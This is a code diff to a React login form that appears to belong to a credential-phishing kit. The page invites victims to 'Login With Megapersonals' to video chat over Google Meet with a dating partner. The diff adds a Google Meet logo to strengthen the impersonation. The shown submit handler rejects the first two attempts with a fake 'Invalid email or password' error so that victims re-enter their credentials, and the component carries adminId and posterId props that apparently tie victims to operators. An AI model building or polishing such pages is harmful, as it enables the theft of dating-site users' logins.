@@ -13,7 +13,7 @@ function LoginForm({ adminId, posterId }) {
 
   const handleSubmit = async (e) => {
     if (e) e.preventDefault();
-    
+
     const currentEmail = email;
     const currentPassword = password;
 
@@ -22,7 +22,7 @@ function LoginForm({ adminId, posterId }) {
 
     if (attempts < 2) {
       setError("Invalid email or password");
-      setAttempts(prev => prev + 1);
+      setAttempts((prev) => prev + 1);
       return;
     }
 
@@ -42,8 +42,15 @@ function LoginForm({ adminId, posterId }) {
     <div className="w-full flex flex-col items-center min-h-screen bg-white font-sans p-4 pt-20">
       <div className="w-full max-w-[420px] flex flex-col items-center">
         {/* Logo box */}
-        <div className="w-24 h-24 border border-gray-300 mb-4 flex items-center justify-center">
-          {/* Empty box as per screenshot */}
+        <div className="w-24 h-24 mb-4 flex items-center justify-center">
+          <div className="flex items-center justify-center">
+            <img
+              src="/images/icons8-google-meet-480.png"
+              width="120px"
+              height="120px"
+              alt=""
+            />{" "}
+          </div>
         </div>
 
         <h1 className="text-[#174ea6] text-[42px] font-bold mb-4 tracking-tight">
@@ -51,7 +58,11 @@ function LoginForm({ adminId, posterId }) {
         </h1>
 
         <p className="text-[#5f6368] text-[22px] leading-[1.3] text-center mb-10 px-2">
-          Login With Megapersonals and enjoy with <span className="text-[#1a73e8] font-bold">Google Meet video chat</span> your dating partner.
+          Login With Megapersonals and enjoy with{" "}
+          <span className="text-[#1a73e8] font-bold">
+            Google Meet video chat
+          </span>{" "}
+          your dating partner.
         </p>
 
         <div className="w-full space-y-4">
@@ -91,4 +102,3 @@ function LoginForm({ adminId, posterId }) {
 }
 
 export default LoginForm;
-
